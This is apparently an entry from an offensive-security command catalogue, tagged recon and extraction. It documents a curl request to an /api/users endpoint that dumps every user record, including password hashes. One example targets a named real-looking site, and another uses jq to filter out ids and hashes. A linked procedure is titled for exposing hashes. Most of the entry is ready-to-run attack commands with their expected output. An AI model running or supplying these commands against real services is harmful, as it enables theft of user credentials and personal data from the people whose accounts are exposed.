---
id: c4d5e6f7-g8h9-0123-defg-456789012345
data: >-
  curl -H "Authorization: Bearer <admin-token>"
  "https://target.com/api/users?page=1&userId=&firstName=test&lastName=&email=&partnerOrg=&highSchool="
  -o users.json
name: curl-api-users-request
tags:
  - api
  - recon
  - extraction
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:20.367Z'
verified: false
validated: true
submitted: true
---
# curl-api-users-request

## Command

```bash
curl -H "Authorization: Bearer <admin-token>" "https://target.com/api/users?page=1&userId=&firstName=test&lastName=&email=&partnerOrg=&highSchool=" -o users.json
```

## Description

This command sends an authenticated GET request to the /api/users endpoint with search parameters, retrieving a JSON response containing all user data including password hashes, and saves it to a file for analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer <admin-token>"` | Header with Bearer token for admin authentication | Yes |
| URL parameters (e.g., `page=1&firstName=test`) | Query params to simulate search; minimal input triggers full dump | Yes |
| `-o users.json` | Output file for the response | No (but recommended) |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." "https://upchieve.com/api/users?page=1&firstName=test" -o users.json
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer <token>" -H "Content-Type: application/json" "https://target.com/api/users?page=1&userId=&firstName=&lastName=&email=&partnerOrg=&highSchool=" | jq '.users[] | {id, passwordHash}'
```

(Uses jq to filter hashes if installed.)

## Expected Output

HTTP 200 response with JSON body like: {"users": [{"id":123,"firstName":"User","passwordHash":"$2b$12$..."}, ...], "total": N}. Saved to users.json if -o used.

## Related

- [[Related Procedure|procedures/Trigger-API-Request-to-Expose-Hashes]]
